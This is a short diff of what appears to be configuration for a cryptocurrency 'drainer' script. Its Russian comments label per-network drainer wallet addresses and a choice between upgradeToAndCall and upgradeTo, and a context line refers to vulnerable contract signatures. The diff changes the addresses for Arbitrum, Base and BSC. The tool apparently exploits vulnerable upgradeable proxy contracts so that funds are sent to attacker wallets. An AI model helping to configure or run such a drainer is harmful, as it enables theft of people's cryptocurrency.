@@ -20,9 +20,9 @@ VULNERABLE_SIGNATURES = {
 
 # 🧲 Адреса дреинеров по сетям
 DRAINER_ADDRESSES = {
-    "arbitrum": "0x799d2575c824b5ee77cC926463b84826745Db3f1",
-    "base":     "0x8eEbb02720952d269c609B589e13Af6152D35bDA",
-    "bsc":      "0xf2a61790981AE64805cc9019670DD3C2499D77D0"
+    "arbitrum": "0xf2a61790981AE64805cc9019670DD3C2499D77D0",
+    "base":     "0x696178F615039e462c8AAbBc0e7ed16006Ac43bB",
+    "bsc":      "0x696178F615039e462c8AAbBc0e7ed16006Ac43bB"
 }
 
 # ⚙️ Использовать ли upgradeToAndCall (True) или upgradeTo (False)
